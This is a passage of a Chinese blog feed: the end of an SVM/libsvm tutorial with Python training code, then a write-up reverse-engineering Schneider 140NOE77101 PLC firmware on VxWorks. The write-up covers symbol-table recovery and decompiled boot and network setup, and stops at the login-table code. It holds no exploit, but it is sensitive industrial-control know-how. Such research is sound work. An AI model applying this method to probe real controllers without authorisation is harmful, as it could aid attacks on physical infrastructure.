kernel function (default 2)</code><ul><li><code>0 -- linear</code></li><li><code>1 -- polynomial</code></li><li><code>2 -- radial basis function</code></li><li><code>3 -- sigmoid</code></li><li><code>4 -- precomputed kernel</code></li></ul></li><li><code>-c cost: set the parameter C of C-SVC, epsilon-SVR, and nu-SVR (default 1)</code></li><li><code>-g gamma: set gamma in kernel function (default 1/num_features)</code></li><li><code>-v n: n-fold cross validation mode</code></li></ul><p>先尝试用<a href="https://github.com/cjlin1/libsvm" target="_blank" rel="noopener">在 Github 上的项目</a>给的例子 <code>heart_scale</code> 熟悉一下基本的函数。大概可以分析出 libsvm 可以直接读取的训练样本的格式，第一列为标记（Label），后面的数据集以 <code>Index:Value</code> 的形式排列：</p><pre><code class="bash">$ head heart_scale+1 1:0.708333 2:1 3:1 4:-0.320755 5:-0.105023 6:-1 7:1 8:-0.419847 9:-1 10:-0.225806 12:1 13:-1-1 1:0.583333 2:-1 3:0.333333 4:-0.603774 5:1 6:-1 7:1 8:0.358779 9:-1 10:-0.483871 12:-1 13:1+1 1:0.166667 2:1 3:-0.333333 4:-0.433962 5:-0.383562 6:-1 7:-1 8:0.0687023 9:-1 10:-0.903226 11:-1 12:-1 13:1-1 1:0.458333 2:1 3:1 4:-0.358491 5:-0.374429 6:-1 7:-1 8:-0.480916 9:1 10:-0.935484 12:-0.333333 13:1-1 1:0.875 2:-1 3:-0.333333 4:-0.509434 5:-0.347032 6:-1 7:1 8:-0.236641 9:1 10:-0.935484 11:-1 12:-0.333333 13:-1-1 1:0.5 2:1 3:1 4:-0.509434 5:-0.767123 6:-1 7:-1 8:0.0534351 9:-1 10:-0.870968 11:-1 12:-1 13:1+1 1:0.125 2:1 3:0.333333 4:-0.320755 5:-0.406393 6:1 7:1 8:0.0839695 9:1 10:-0.806452 12:-0.333333 13:0.5+1 1:0.25 2:1 3:1 4:-0.698113 5:-0.484018 6:-1 7:1 8:0.0839695 9:1 10:-0.612903 12:-0.333333 13:1+1 1:0.291667 2:1 3:1 4:-0.132075 5:-0.237443 6:-1 7:1 8:0.51145 9:-1 10:-0.612903 12:0.333333 13:1+1 1:0.416667 2:-1 3:1 4:0.0566038 5:0.283105 6:-1 7:1 8:0.267176 9:-1 10:0.290323 12:1 13:1</code></pre><p>使用 <code>svm_read_problem</code> 读取标记和数据集，使用 <code>svm_train</code> 训练指定数据，并最后使用 <code>svm_predict</code> 进行测试数据：</p><pre><code class="python">#!/usr/bin/env python3from libsvm.svmutil import *y, x = svm_read_problem(&#39;./heart_scale&#39;) # 获取全部的标记和数据集m = svm_train(y[:200], x[:200], &#39;-c 4&#39;) # 对前200组数据进行训练，并采用p_label, p_acc, p_val = svm_predict(y[200:], x[200:], m) # 对200组之后所有的数据进行测试</code></pre><p>训练的效果如下，在剩下的 70 组数据中测试的正确率为 84.2857%：</p><pre><code class="bash">$ ./heart_scale.py*.*optimization finished, #iter = 257nu = 0.351161obj = -225.628984, rho = 0.636110nSV = 91, nBSV = 49Total nSV = 91Accuracy = 84.2857% (59/70) (classification)</code></pre><p>接下来是对兵王问题的训练和测试。这里的数据在读取时需要做一点处理，全部转换成数字。中间训练的过程就是寻找较为准确的 $C$ 和 $\gamma$ 的过程（归一化、缩小范围）。最后使用生成的模型进行测试：</p><pre><code class="python">#!/usr/bin/env python3from libsvm.svmutil import *from operator import itemgetterimport numpy as npimport randomdef readData(filename): # 读取数据    xApp = []    yApp = []    with open(filename, &#39;rb&#39;) as f:        data = f.readlines()    for l in data:        t = l.split(b&#39;,&#39;)        # 二分类问题        if t[-1].startswith(b&#39;draw&#39;):            y = 0 # 平局为0        else:            y = 1 # 胜出为1        del t[-1]        # 把字母转化为数字        xs = [int(c) if ord(c) &lt; 0x3a and ord(c) &gt; 0x2f else ord(c) - ord(&#39;a&#39;) for c in t]        xApp.append(xs)        yApp.append(y)    return yApp, xAppdef dealWithData(yApp, xApp, trainingDataLength): # 处理数据    xTraining = []    yTraining = []    xTesting = []    yTesting = []    idxs = list(range(len(xApp)))    random.shuffle(idxs) # 打乱数据    for i in range(trainingDataLength):        xTraining.append(xApp[idxs[i]])        yTraining.append(yApp[idxs[i]])    for i in range(trainingDataLength, len(xApp)):        xTesting.append(xApp[idxs[i]])        yTesting.append(yApp[idxs[i]])    avgX = np.mean(np.mat(xTraining), axis=0).tolist()[0] # 计算训练数据集各个维度的算术平均值    stdX = np.std(np.mat(xTraining), axis=0).tolist()[0] # 计算训练数据集各个维度的标准方差    print(&#39;[*] avgX = &#39; + str(avgX))    print(&#39;[*] stdX = &#39; + str(stdX))    # 样本归一化    for data in xTraining:        for i in range(len(data)):            data[i] = (data[i] - avgX[i]) / stdX[i]    for data in xTesting:        for i in range(len(data)):            data[i] = (data[i] - avgX[i]) / stdX[i]    return yTraining, xTraining, yTesting, xTestingdef trainingModel(label, data, modelFilename): # 训练模型    CScale = [-5, -3, -1, 1, 3, 5, 7, 9, 11, 13, 15]    gammaScale = [-15, -13, -11, -9, -7, -5, -3, -1, 1, 3]    maxRecognitionRate = 0    maxC = 0    maxGamma = 0    for C in CScale:        C_ = pow(2, C)        for gamma in gammaScale:            gamma_ = pow(2, gamma)            cmd = &#39;-t 2 -c &#39; + str(C_) + &#39; -g &#39; + str(gamma_) + &#39; -v 5 -q&#39;            recognitionRate = svm_train(label, data, cmd)            # 比较获取准确率最高的C和gamma            if recognitionRate &gt; maxRecognitionRate:                maxRecognitionRate = recognitionRate                maxC = C                maxGamma = gamma    n = 10    minCScale = 0.5 * (min(-5, maxC) + maxC)    maxCScale = 0.5 * (max(15, maxC) + maxC)    newCScale = np.arange(minCScale, maxCScale+1, (maxCScale-minCScale)/n)    print(&#39;[*] newCScale = &#39; + str(newCScale))    minGammaScale = 0.5 * (min(-15, maxGamma) + maxGamma)    maxGammaScale = 0.5 * (max(3, maxGamma) + maxGamma)    newGammaScale = np.arange(minGammaScale, maxGammaScale+1, (maxGammaScale-minGammaScale)/n)    print(&#39;[*] newGammaScale = &#39; + str(newGammaScale))    for C in newCScale:        C_ = pow(2, C)        for gamma in newGammaScale:            gamma_ = pow(2, gamma)            cmd = &#39;-t 2 -c &#39; + str(C_) + &#39; -g &#39; + str(gamma_) + &#39; -v 5 -q&#39;            recognitionRate = svm_train(label, data, cmd)            # 比较获取准确率最高的C和gamma            if recognitionRate &gt; maxRecognitionRate:                maxRecognitionRate = recognitionRate                maxC = C                maxGamma = gamma    # 使用最终确定的C和gamma训练模型    print(&#39;[*] maxC = &#39; + str(maxC))    print(&#39;[*] maxGamma = &#39; + str(maxGamma))    C = pow(2, maxC)    gamma = pow(2, maxGamma)    cmd = &#39;-t 2 -c &#39; + str(C) + &#39; -g &#39; + str(gamma)    model = svm_train(label, data, cmd)    svm_save_model(modelFilename, model)    return modelif __name__ == &#39;__main__&#39;:    yApp, xApp = readData(&#39;krkopt.data&#39;)    yTraining, xTraining, yTesting, xTesting = dealWithData(yApp, xApp, 5000)    if input(&#39;Train or not? (y/n) &#39;) == &#39;y&#39;:        model = trainingModel(yTraining, xTraining, &#39;krkopt.model&#39;)    else:        model = svm_load_model(&#39;krkopt.model&#39;)    yPred, accuracy, decisionValues = svm_predict(yTesting, xTesting, model)</code></pre><p>最后测试的结果大约为 99.4492%：</p><pre><code class="bash">$ ./testSVMChessLibSVM.py[*] avgX = [2.0886, 1.8438, 3.5566, 4.557, 3.9804, 4.4256][*] stdX = [0.9459122792309963, 0.9203268767128373, 2.291548917217361, 2.2831449800658565, 2.3259440749940588, 2.265582627052049]Train or not? (y/n) yCross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%...Cross Validation Accuracy = 89.9%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 90.08%Cross Validation Accuracy = 99.26%Cross Validation Accuracy = 99.32%Cross Validation Accuracy = 99.18%Cross Validation Accuracy = 98.56%Cross Validation Accuracy = 98.56%Cross Validation Accuracy = 95.46%Cross Validation Accuracy = 89.88%[*] newCScale = [ 3.  4.  5.  6.  7.  8.  9. 10. 11. 12. 13.][*] newGammaScale = [-10.   -9.1  -8.2  -7.3  -6.4  -5.5  -4.6  -3.7  -2.8  -1.9  -1.   -0.1]Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 89.58%Cross Validation Accuracy = 90.62%Cross Validation Accuracy = 96.2%Cross Validation Accuracy = 98.5%Cross Validation Accuracy = 98.92%Cross Validation Accuracy = 98.7%...Cross Validation Accuracy = 98.28%Cross Validation Accuracy = 99.2%Cross Validation Accuracy = 99.24%Cross Validation Accuracy = 99.28%Cross Validation Accuracy = 99.34%Cross Validation Accuracy = 99.16%Cross Validation Accuracy = 98.94%Cross Validation Accuracy = 98.76%Cross Validation Accuracy = 98.76%Cross Validation Accuracy = 98.86%Cross Validation Accuracy = 97.9%[*] maxC = 11[*] maxGamma = -5...............................................................................................................*........................................................................................................................................................................*................................................................................................*optimization finished, #iter = 375498nu = 0.033157obj = -251795.371532, rho = -81.180115nSV = 228, nBSV = 110Total nSV = 228Accuracy = 99.4492% (22929/23056) (classification)</code></pre><h3 id="混淆矩阵"><a href="#混淆矩阵" class="headerlink" title="混淆矩阵"></a>混淆矩阵</h3><ul><li>TP（True Positive）：将正样本识别为正样本的数量（或概率）；</li><li>FN（False Negative）：将正样本识别为负样本的数量（或概率）；</li><li>FP（False Positive）：将负样本识别为正样本的数量（或概率）；</li><li>TN（True Negative）：将负样本识别为负样本的数量（或概率）。</li></ul><h4 id="ROC（Receiver-Operating-Charactor）曲线"><a href="#ROC（Receiver-Operating-Charactor）曲线" class="headerlink" title="ROC（Receiver Operating Charactor）曲线"></a>ROC（Receiver Operating Charactor）曲线</h4><p>ROC 曲线是一条横坐标 FP，纵坐标 TP 的曲线。四个概率 TP、FN、FP、TN 的关系：</p><ol><li>$TP+FN=1$；</li><li>$FP+TN=1$；</li><li>对同一个系统来说，若 $TP$ 增加，则 $FP$ 也增加；</li><li>在 FP 为 0 的情况下，TP 的值越高则系统性能越好。</li></ol><p>等错误率（Equal Error Rate）是两类错误 FP 和 FN 相等时候的错误率，可以直观地表示系统性能。以上面兵王问题画出的 ROC 曲线和 ERR 为例：</p><pre><code class="python">#!/usr/bin/env python3# ...import matplotlib.pyplot as plt# ...def drawROC(yTesting, decisionValues): # 绘制ROC曲线    values, labels = [list(x) for x in zip(*sorted(zip(decisionValues, yTesting), key=itemgetter(0)))]    truePositive = [0 for i in range(len(values) + 1)]    trueNegative = [0 for i in range(len(values) + 1)]    falsePositive = [0 for i in range(len(values) + 1)]    falseNegative = [0 for i in range(len(values) + 1)]    for i in range(len(values)):        if labels[i] == 1:            truePositive[0] += 1        else:            falsePositive[0] += 1    for i in range(len(values)):        if labels[i] == 1:            truePositive[i + 1] = truePositive[i] - 1            falsePositive[i + 1] = falsePositive[i]        else:            falsePositive[i + 1] = falsePositive[i] - 1            truePositive[i + 1] = truePositive[i]    truePositive = (np.array(truePositive) / truePositive[0]).tolist()    falsePositive = (np.array(falsePositive) / falsePositive[0]).tolist()    plt.xlabel(&#39;False Positive&#39;)    plt.ylabel(&#39;True Positive&#39;)    plt.plot(falsePositive, truePositive, color=&#39;blue&#39;) # ROC    plt.plot([1,0], [0,1], color=&#39;red&#39;) # EER    plt.legend([&#39;ROC&#39;, &#39;EER&#39;])    plt.show()if __name__ == &#39;__main__&#39;:    # ...    drawROC(yTesting, decisionValues)</code></pre><p><img src="/pics/Machine-Learning-SVM/4.png" srcset="/img/loading.gif" alt></p><h2 id="SVM-处理多分类问题"><a href="#SVM-处理多分类问题" class="headerlink" title="SVM 处理多分类问题"></a>SVM 处理多分类问题</h2><p>SVM 有三种方式处理多类问题，即类别大于 2 的问题：</p><ul><li>改造优化的目标函数和限制条件，使之能处理多类问题；</li><li>一类对其他类；</li><li>一类对另一类。</li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p>《机器学习》——周志华<br>浙江大学信电学院《机器学习》课程</p>]]></content>
    
    
    
    <tags>
      
      <tag>ml</tag>
      
      <tag>svm</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>施耐德140NOE77101固件逆向分析</title>
    <link href="/2020/07/05/%E6%96%BD%E8%80%90%E5%BE%B7140NOE77101%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/"/>
    <url>/2020/07/05/%E6%96%BD%E8%80%90%E5%BE%B7140NOE77101%E5%9B%BA%E4%BB%B6%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>PLC 固件分析。</p><a id="more"></a><h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>分析的对象是施耐德昆腾系列 PLC 的 NOE-711 以太网模块的固件：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/1.png" srcset="/img/loading.gif" alt></p><p>进行逆向的固件是施耐德在 VxWorks 上进行的二次开发，所以分析过程中会涉及到很多操作系统中的知识。</p><blockquote><p>特别感谢 <a href="https://www.anquanke.com/member/141205" target="_blank" rel="noopener">Asa9ao 师傅</a>的文章。</p></blockquote><h1 id="Preliminary-Analysis"><a href="#Preliminary-Analysis" class="headerlink" title="Preliminary Analysis"></a>Preliminary Analysis</h1><p>首先用 Binwalk 分析一下文件格式（先使用 <code>binwalk -e</code> 提取文件，再对提取出的文件进行分析），可以看到固件采用的操作系统（PowerPC big-endian）、内核版本（VxWorks 5）、符号表（起始地址为 0x301E74）等相关信息：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/2.png" srcset="/img/loading.gif" alt></p><p>接下来载入 IDA，处理器选择 PowerPC big-endian 后直接加载：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/3.png" srcset="/img/loading.gif" alt></p><p>PPC 中共有 32 个通用寄存器，各个寄存器的用途见<a href="#PowerPC-寄存器">附录</a>。先在 IDA 中做一个简单的分析，看一下在 0x4C 处的一段汇编：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/4.png" srcset="/img/loading.gif" alt></p><p>先看前两条指令，<code>lis</code> 用于加载立即数，将 16 位整型 1 传至 r1 并左移 16 位，即将寄存器的第 17 位设为 1（可能是因为大端序）；<code>addi</code> 把 r1 的低 16 位加 0 后的结果再赋给 r1 的低 16 位。相当于将 r1 的值设置为 0x10000：</p><pre><code class="ppc">lis r1, 1addi r1, r1, 0</code></pre><p>接下来对 r3 做同样的操作，然后将 r1 的低 16 位减 0x10（开辟栈空间），最后 <code>b</code> 指令用于调用函数：</p><pre><code class="ppc">lis r3, 1addi r3, r3, 0addi r1, r1, -0x10b loc_1CD94</code></pre><p>根据对 r1 的操作可以判断出这里的一部分其实是对栈进行初始化，故固件的加载地址应该是前面为 r1 设置的 0x10000，则我们可以重新加载 IDA 并设置 ROM 和 RAM 的起始地址为 0x10000。接下来对符号表进行修复。用 010 Editor 打开固件，定位到符号表起始地址（之前 Binwalk 分析得到）。因为 VxWorks 5 的符号表比较特殊，16 字节为一组符号信息，分别表示符号字符串地址、符号所在地址、特殊标识（比如 0x0500 就是函数的意思）、0 填充位。根据 16 字节一组的规律，可以定位到 0x3293A4 为符号表的结尾：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/5.png" srcset="/img/loading.gif" alt></p><p>根据上面的信息，编写 IDA-Python 脚本对代码重新进行分析：</p><pre><code class="python">from idaapi import *loadAddress = 0x10000eaStart = 0x301E64 + loadAddresseaEnd = 0x3293A4 + loadAddressea = eaStartwhile ea &lt; eaEnd:    offset = 0    MakeStr(Dword(ea - offset), BADADDR)    sName = GetString(Dword(ea - offset), -1, ASCSTR_C)    print sName    if sName:        eaFunc = Dword(ea - offset + 4)        MakeName(eaFunc, sName)        MakeCode(eaFunc)        MakeFunction(eaFunc, BADADDR)    ea += 0x10</code></pre><p>脚本执行完成后，可以看到 IDA 通过符号表重新设置好了函数名：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/6.png" srcset="/img/loading.gif" alt></p><blockquote><p>如果遇到 <code>MakeStr</code> 函数报错，见<a href="https://bbs.pediy.com/thread-229574.htm" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><h1 id="How-VxWorks-System-Works"><a href="#How-VxWorks-System-Works" class="headerlink" title="How VxWorks System Works?"></a>How VxWorks System Works?</h1><p>经过上面的分析，已经对该固件有了初步的认识。接下来从 VxWorks 操作系统的角度来更进一步地了解固件。为了更好地分析，接下来转战 Ghidra，因为其支持 PPC 的反汇编。同时前面修复符号表的任务可以通过插件 <a href="https://github.com/PAGalaxyLab/vxhunter" target="_blank" rel="noopener">vxhunter</a> 来实现（具体操作见 README）。先顺着上面的分析，再看看 <code>_sysInit</code> 前面的部分，一开始的部分主要是 <code>isync</code> 指令（指令同步）：</p><pre><code class="ppc">mfmsr r3rlwinm r4, r3, 0, 17, 15rlwinm r4, r4, 0, 28, 25rlwinm r4, r4, 0, 26, 24mtmsr r4isync</code></pre><p>接下来对 r4 进行操作，主要是通过 <code>mtspr</code> 将特殊寄存器 <code>DC_CST</code> 的值设置为 0xC0000。<code>tlbia</code> 指令则对应快表（TLB）的相关操作：</p><pre><code class="ppc">lis r4, 0x400addi r4, r4, 0mtspr IC_CSR, r4mtspr DC_CST, r4lis r4, 0xA00addi r4, r4, 0mtspr IC_CSR, r4mtspr DC_CST, r4lis r4, 0xC00addi r4, r4, 0mtspr IC_CSR, r4mtspr DC_CST, r4tlbia</code></pre><p>然后看看这部分反编译的结果。大致上没有问题，就是 Ghidra 错把 r4 的值也当成了 <code>usrInit</code> 的参数：</p><pre><code class="cpp">void _sysInit(void){  instructionSynchronize();  TLBInvalidateAll();  usrInit(0,0xc000000);  return;}</code></pre><p>接下来就是 <code>usrInit</code> 函数：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/7.png" srcset="/img/loading.gif" alt></p><p>一开始的部分是 PPC 下的 Function Prologs。先通过 <code>stwu</code> 把 r1 的值存到 local_18+r1 的内存地址上；<code>mfspr</code> 将 LR 寄存器的值（记录函数返回地址）赋给 r0；接下来再将 r31 的值存到 local_4+r1 的内存地址上，再把 r0 的值放到 local_res4+r1 的内存地址上（local_res4 是正数，意味着把 r0 放到了栈底往上的部分，其实就是把函数返回地址存到栈上）；最后 <code>or</code> 将 r1 和自己按位或并把结果存入 r31，相当于 x86 下的 <code>mov r31, r1</code>：</p><pre><code class="ppc">stwu r1, local_18(r1)mfspr r0, LRstw r31, local_4(r1)stw r0, local_res4(r1)or r31, r1, r1</code></pre><p>下面的部分是一系列的函数调用，到最后是恢复堆栈以及 <code>blr</code> 返回到上一层函数：</p><pre><code class="ppc">stw r3, local_10(r31)lwz r3, local_10(r31)bl sysStartli r3, 0x1li r4, 0x1bl cacheLibInitbl excVecInitbl sysHwInitbl usrCacheEnablebl wvLibInitbl usrKernelInitlwz r11, 0x0(r1)=&gt;local_18lwz r0, 0x4(r11)mtspr LR, r0lwz r31, -0x4(r11)or r1, r11, r11blr</code></pre><p>反编译后得到大致的代码，接下来就主要根据反编译的代码来分析：</p><pre><code class="cpp">void usrInit(undefined4 param_1){  sysStart(param_1);  cacheLibInit(1,1);  excVecInit();  sysHwInit();  usrCacheEnable();  wvLibInit();  usrKernelInit();  return;}</code></pre><p>根据前面的分析，可以判断 <code>sysStart</code> 中传入的参数是 r3。首先调用 <code>bzero</code> 将两个参数（内存地址）之间的内存置 0；然后设置系统的启动类型 <code>sysStartType</code> 为传入的参数，其中启动类型包括有 BootRAM 启动和 ROM 启动，压缩式和非压缩式等；最后调用 <code>intVecBaseSet</code> 初始化系统的中断向量表的起始地址为 0：</p><pre><code class="cpp">void sysStart(undefined4 param_1){  bzero(&amp;_func_smObjObjShow,0x157914);  sysStartType = param_1;  intVecBaseSet(0);  return;}</code></pre><p>接下来再看看 <code>excVecInit</code>，总体上来说是在初始化中断向量表：</p><pre><code class="cpp">undefined4 excVecInit(void){  int *piVar1;  undefined4 *puVar2;  puVar2 = &amp;DAT_0030a488;  if (PTR_excExcHandle_0030a490 != (undefined *)0x0) {    do {      (*(code *)puVar2[1])(*puVar2,puVar2[2]);      piVar1 = puVar2 + 5;      puVar2 = puVar2 + 3;    } while (*piVar1 != 0);  }  return 0;}</code></pre><p>具体根据 <code>puVar2</code> 指向的地址来看。<code>puVar2[0]</code> 为下标、<code>puVar2[1]</code> 指向函数地址（指向 <code>excConnect</code>）、<code>puVar2[2]</code> 则指向另一个函数（指向 <code>excExcHandle</code>）。3 个双字一组（12 个字节），每次检查下一组的 <code>excExcHandle</code> 是否为 0，如果是则结束对中断向量表的初始化过程：</p><p><img src="/pics/施耐德140NOE77101固件逆向分析/8.png" srcset="/img/loading.gif" alt></p><p>接下来的 <code>sysHwInit</code> 用来将各种外设进行简单的初始化，同时让他们保持“沉默”。因为 CPU 通过中断来响应外设，但由于现在没完全建立起中断体，所以一旦产生中断，就会出现没有中断处理函数的情况，进而导致系统出错：</p><pre><code class="cpp">void sysHwInit(void){  uint uVar1;  int iVar2;  size_t sVar3;  undefined auStack24 [8];  int local_10;  local_10 = vxImmrGet();  MPC860ClocksInit();  CpicInit();  uVar1 = _GetMPC860Rev();  if (uVar1 &lt; 0x89a) {    *(undefined2 *)(local_10 + 0x952) = 0;    *(undefined2 *)(local_10 + 0x950) = 0;    *(undefined2 *)(local_10 + 0x954) = 0;    *(undefined4 *)(local_10 + 0xabc) = 0;    *(undefined4 *)(local_10 + 0xab8) = 0;    *(undefined2 *)(local_10 + 0xac2) = 0;    *(undefined2 *)(local_10 + 0x962) = 0;    *(undefined2 *)(local_10 + 0x960) = 0;    *(undefined2 *)(local_10 + 0x964) = 0;    *(undefined2 *)(local_10 + 0x972) = 0;    *(undefined2 *)(local_10 + 0x970) = 0;  }  else {    *(undefined2 *)(local_10 + 0x952) = 0xf830;    *(undefined2 *)(local_10 + 0x950) = 0x830;    *(undefined2 *)(local_10 + 0x954) = 0;    *(undefined2 *)(local_10 + 0x956) = 0x200;    *(undefined4 *)(local_10 + 0xabc) = 0x80080000;    *(undefined4 *)(local_10 + 0xab8) = 0x10013e;    *(undefined2 *)(local_10 + 0xac2) = 0;    *(undefined2 *)(local_10 + 0x962) = 0xc;    *(undefined2 *)(local_10 + 0x960) = 0x10;    *(undefined2 *)(local_10 + 0x964) = 0;  }  *(undefined4 *)(local_10 + 0xaec) = 0;  ppc860IntrInit(9);  sysSerialHwInit();  iVar2 = sysNvRamGet(auStack24,6,0xfffffffa);  if (iVar2 != -1) {    iVar2 = strcmp(auStack24,s_50MHZ_00205568);    if (iVar2 != 0) {      sVar3 = strlen(s_fec(0,0)_labcomm1:smooney_100MB\_00205570);      sysNvRamSet(s_fec(0,0)_labcomm1:smooney_100MB\_00205570,sVar3 + 1,0);      sysNvRamSet(s_50MHZ_00205568,6,0xfffffffa);    }    iVar2 = strncmp(sysBootLine,&amp;DAT_00205618,3);    if (iVar2 != 0) {      *sysBootLine = &#39;\0&#39;;    }  }  sysCpmEnetDisable(0);  sysCpmEnetIntDisable(0);  vxPowerModeSet(1);  MPC860Init();  return;}</code></pre><p>像 <code>usrCacheEnable</code> 这样类似 <code>xxxEnable</code> 的函数都是“使能”的意思（数字电路中的使能端）。只有使能了，这个固件才可以使用：</p><pre><code class="cpp">undefined4 usrCacheEnable(void){  cacheEnable(0);  cacheEnable(1);  AisysMmuCache();  return 0;}</code></pre><p>最后也是最关键的 <code>usrKernelInit</code>。前面 <code>xxxLibInit</code> 部分都是对函数库的初始化，<code>qInit</code> 以及 <code>workQInit</code> 是对队列的初始化；最后则调用了 <code>kernelInit</code> 函数：</p><pre><code class="cpp">void usrKernelInit(void){  undefined4 uVar1;  classLibInit();  taskLibInit();  qInit(&amp;readyQHead,qPriBMapClassId,&amp;readyQBMap,0x100);  qInit(&amp;activeQHead,qFifoClassId);  qInit(&amp;tickQHead,qPriListClassId);  workQInit();  uVar1 = sysMemTop();  kernelInit(usrRoot,20000,0x490d2c,uVar1,5000,0);  return;}</code></pre><p>在 <code>kernelInit</code> 函数中主要就是创建并执行了一个任务，同时设置了该任务的 TCB、栈、内存池等。这里创建的任务就是 <code>usrRoot</code>：</p><pre><code class="cpp">void kernelInit(undefined4 param_1,int param_2,int param_3,uint param_4,int param_5,               undefined4 param_6){  uint uVar1;  uint uVar2;  int iVar3;  int iVar4;  int iVar5;  undefined auStack552 [516];  rootMemNBytes = param_2 + 7U &amp; 0xfffffff8;  uVar1 = param_3 + 7U &amp; 0xfffffff8;  uVar2 = param_5 + 7U &amp; 0xfffffff8;  intLockLevelSet(param_6);  roundRobinOn = 0;  vxTicks = 0;  vxIntStackBase = uVar1 + uVar2;  vxIntStackEnd = uVar1;  bfill(uVar1,uVar2,0xee);  windIntStackSet(vxIntStackBase);  iVar3 = vxIntStackBase;  taskIdCurrent = (undefined *)0x0;  pRootMemStart = (param_4 &amp; 0xfffffff8) - rootMemNBytes;  iVar5 = rootMemNBytes - 0x220;  iVar4 = pRootMemStart + iVar5 + 0x18;  bfill(auStack552,0x200,0);  taskInit(iVar4,s_tRootTask_0022bf08,0,6,iVar4,iVar5,param_1,iVar3,pRootMemStart -iVar3,0,0,0,0,0,           0,0,0);  taskIdCurrent = auStack552;  rootTaskId = iVar4;  taskActivate(iVar4);  return;}</code></pre><h2 id="Create-a-new-task-——-usrRoot"><a href="#Create-a-new-task-——-usrRoot" class="headerlink" title="Create a new task —— usrRoot"></a>Create a new task —— <code>usrRoot</code></h2><p>在 <code>usrRoot</code> 中，调用了一系列函数对系统进行初始化，最终在 <code>usrAppInit</code> 中进入系统：</p><pre><code class="cpp">void usrRoot(undefined4 param_1,undefined4 param_2){  usrKernelCoreInit();  memPartLibInit(param_1,param_2);  memInit(param_1,param_2);  sysClkInit();  usrIosCoreInit();  usrKernelExtraInit();  usrIosExtraInit();  usrNetworkInit();  selectInit();  usrToolsInit();  cplusLibInit();  cplusDemanglerInit();  usrAppInit();  return;}</code></pre><p>接下来一个一个来看 <code>usrRoot</code> 中的函数。首先是 <code>usrKernelCoreInit</code>，主要作用是对一些功能进行初始化，sem 开头的代表信号量；wd 即 Watch Dog，用于监测系统有没有严重到无法恢复的错误，有的话将重启系统；msgQ 则是消息队列；taskHook 则是和 hook 相关的内容：</p><pre><code class="cpp">void usrKernelCoreInit(void){  semBLibInit();  semMLibInit();  semCLibInit();  msgQLibInit();  wdLibInit();  taskHookInit();  return;}</code></pre><p>接下来调用 <code>memPartLibInit</code> 和 <code>memInit</code> 初始化系统的内存堆，这之后就能正常地调用 malloc 和 free 了：</p><pre><code class="cpp">int memPartLibInit(undefined4 param_1,undefined4 param_2){  int iVar1;  if ((DAT_0030b8fc == 0) &amp;&amp;     (iVar1 = classInit(memPartClassId,0x44,0,memPartCreate,memPartInit,FUN_0018c634), iVar1 ==0))  {    *(undefined **)(memPartClassId + 0x24) = memPartInstClassId;    classInstrument();    memPartInit(&amp;DAT_0030b884,param_1,param_2);    DAT_0030b8fc = 1;  }  return -(uint)(DAT_0030b8fc == 0);}void memInit(undefined4 param_1,undefined4 param_2){  memLibInit();  memPartLibInit(param_1,param_2);  return;}</code></pre><p>然后调用 <code>sysClkInit</code> 初始化时钟，其中包括一些时钟中断系统的初始化：</p><pre><code class="cpp">void sysClkInit(void){  sysClkConnect(usrClock,0);  sysClkRateSet(0x3c);  sysClkEnable();  return;}</code></pre><p>剩下的部分主要再来看看网络的初始化。</p><h2 id="Dive-into-PLC’s-Network"><a href="#Dive-into-PLC’s-Network" class="headerlink" title="Dive into PLC’s Network"></a>Dive into PLC’s Network</h2><p>在 <code>usrNetworkInit</code> 函数中包括加载网络设备、启动网络设备等等工作：</p><pre><code class="cpp">void usrNetworkInit(void){  usrNetProtoInit();  muxLibInit();  usrEndLibInit();  usrNetworkBoot();  usrNetRemoteInit();  usrNetAppInit();  return;}</code></pre><p>首先 <code>usrNetProtoInit</code> 函数是对网络协议的初始化，包括有 UDP、TCP、ICMP 等常见的网络协议：</p><pre><code class="cpp">void usrNetProtoInit(void){  usrBsdSockLibInit();  hostTblInit();  usrIpLibInit();  udpLibInit(&amp;udpCfgParams);  udpShowInit();  tcpLibInit(&amp;tcpCfgParams);  tcpShowInit();  icmpLibInit(&amp;icmpCfgParams);  icmpShowInit();  igmpLibInit();  mCastRouteLibInit();  netLibInit();  tcpTraceInit();  netShowInit();  return;}</code></pre><p>在 <code>usrNetworkBoot</code> 中主要进行处理网络的地址、设备名：</p><pre><code class="cpp">void usrNetworkBoot(void){  usrNetBoot();  usrNetworkAddrInit();  usrNetmaskGet();  usrNetDevNameGet();  usrNetworkDevStart();  return;}</code></pre><p>接下来 <code>usrNetRemoteInit</code> 函数创建 remote 进程，设备连接至网络：</p><pre><code class="cpp">void usrNetRemoteInit(void){  usrNetHostSetup();  usrNetRemoteCreate();  return;}</code></pre><p>最后调用 <code>usrNetAppInit</code>，其中会包括 TFTP（一种以 UDP 为基础的文件传输协议）、SNMP（简单网络管理协议）等的初始化：</p><pre><code class="cpp">void usrNetAppInit(void){  usrSecurity();  tftpdInit(0,0,0,0,0);  sntpcInit(0x7b);  pingLibInit();  usrSnmpdInit();  return;}</code></pre><p>除了其他函数外，<code>usrSecurity</code> 函数中主要创建了一个用户登录的表，在最后调用的 <code>loginUserAdd</code> 